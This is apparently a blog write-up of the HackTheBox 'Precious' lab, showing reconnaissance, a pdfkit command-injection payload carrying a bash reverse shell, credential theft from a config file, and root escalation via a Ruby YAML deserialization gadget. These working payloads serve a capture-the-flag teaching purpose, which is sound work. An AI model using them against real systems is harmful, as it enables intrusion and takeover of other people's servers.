---
title: Writeup Precious HTB
author: lazy29t
date: 2023-01-22 20:55:00 +0800
categories: [HackTheBox, EASY]
tags: [pentesting, CVE, exploit]
permalink: /HackTheBox/EASY/precious
pin: true
math: true
mermaid: true

---

![HTB Img](/assets/img//HTB/EASY/Photobomb/Precious.png){: width="800" height="500" }

## Recognizement

First step you have to verify if the machine is active throught an **ICMP** ping.
```console
$ ping -c 1 10.10.11.189
```
### Nmap

After that we're going to scan it with nmap tool for discover what ports are exposed on that machine
```console
$ nmap -p- -sCV --min-rate 5000 -v -n -Pn 10.10.11.189                                                                                                    
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...

```
With that information we are going to visit the website [http://precious.htb](http://precious.htb/), after that we can look at see the next main panel, tell us put an `url` 
for convert to pdf file 



![HTB Img](/assets/img//HTB/EASY/precious-main.png){: width="800" height="300" }

---

### Enumeration
So with that panel we have to write our vpn from plataform

![HTB Img](/assets/img//HTB/EASY/clueping.png){: width="800" height="300" }

Then we have to create a web server with python to see any request from that website

```console
$ python3 -m http.server 80 
```
well...

```console
$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - "GET / HTTP/1.1" 200 -

```
How we can see, we received a request from our http server, so we are save the pdf file and see what we got it.

![HTB Img](/assets/img//HTB/EASY/clue1.png)

Already with the pdf file downloaded and saved in the Downloads folder

```console
$ ls                                            
file.pdf 
```
 We will use `exiftool` to know the metadata of that file

```console
$ exiftool file.pdf 
ExifTool Version Number         : 12.55
File Name                       : filepdf
Directory                       : .
File Size                       : 18 kB
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6

```

## Exploit

It is discovered that file is generate by `pdfkit`, so with that we are going to reasearch about this version.

It version has this [**vulnerability**](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) that it allow us put any payload on main panel
so that POC instead of that payload, we are replace for a reverse shell payload

```console
http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.19/443 0>&1"`'}
```
> you have that [web](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) if you want try another method ;).
{: .prompt-tip }

So before to send that payload we are listen with [**netcat**]

```console
$ nc -lvnp 443
listening on [any] 443 ...
```
And now we are send the reverse shell payload

![HTB Img](/assets/img//HTB/EASY/clue2.png){: width="800" height="300" }

then, we have a shell from an user **ruby**

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 49814
ruby@precious:/var/www/pdfapp$ 

```
So already there we have to research any information, until found from bundle folder we see the config file
showing us the following information

```console
$ ruby@precious:~/.bundle$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

```
We have an user calling `henry` and his password, so with that information we are going to test sign in for ssh port

```console
$ ssh  henry@10.10.11.189 
henry@10.10.11.189's password: 
-----
henry@precious:~$ 

```
And TADAAHH we got the access machine 

```console
henry@precious:~$ ls
user.txt

henry@precious:~$ cat user.txt
13***********

```
And we got the first user flag ~(^o^)~

## Privileges Escalation

Now we are going to start the privileges escalation started for research permissions throught sudoers
Got the next result

```console
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
And how we can see this user may to run this file from `/opt/update_dependencies.rb`

```console
henry@precious:~$ cat /opt/update_dependencies.rb
---
def list_from_file
    YAML.load(File.read("dependencies.yml"))
end
```
so seeying that script has to load any file called `dependencies.yml` and researched we can used this [**script**](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) to become a bash to uid changed the sleep command from *git_set* to **chmod u+s /bin/bash** command

```console
henry@precious:~$ cat dependencies.yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve
 ```
we running the script with the yml we've created become it a `bash` to `uid` 

```console
henry@precious:~$ sudo ruby /opt/update_dependencies.rb 2>/dev/null
henry@precious:~$ bash -p
bash-5.1# whoami
root

```
Now we can got the **root** flag (^▽^)

```console
bash-5.1# cat /root/root.txt 
G6****************
bash-5.1#
```


[starter]: https://github.com/cotes2020/chirpy-starter
[use-starter]: https://github.com/cotes2020/chirpy-starter/generate
[workflow]: https://github.com/cotes2020/jekyll-theme-chirpy/blob/master/.github/workflows/pages-deploy.yml.hook
[pages-workflow-src]: https://docs.github.com/en/pages/getting-started-with-github-pages/configuring-a-publishing-source-for-your-github-pages-site#publishing-with-a-custom-github-actions-workflow
[latest-tag]: https://github.com/cotes2020/jekyll-theme-chirpy/tags
